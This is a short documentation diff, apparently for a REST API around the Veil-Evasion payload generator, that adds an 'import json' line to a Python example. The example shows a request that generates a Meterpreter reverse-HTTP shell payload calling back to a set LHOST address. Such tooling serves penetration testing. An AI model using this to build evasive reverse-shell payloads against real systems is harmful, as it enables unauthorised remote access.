@@ -89,6 +89,8 @@ REST API is entirely JSON based, both requests and respoonses. The following is 
 This is a simple example of working with Veil-Evasion using Python and python-requests.
 
 ```
+In [34]: import json
+
 In [35]: import requests
 
 In [36]: requests.post('http://127.0.0.1:4242/', data=json.dumps({'action': 'generate', 'options': {'payload': 'c/meterpreter/rev_http', 'LHOST': '192.168.2.236', 'outputbase': 'hello'}})).content
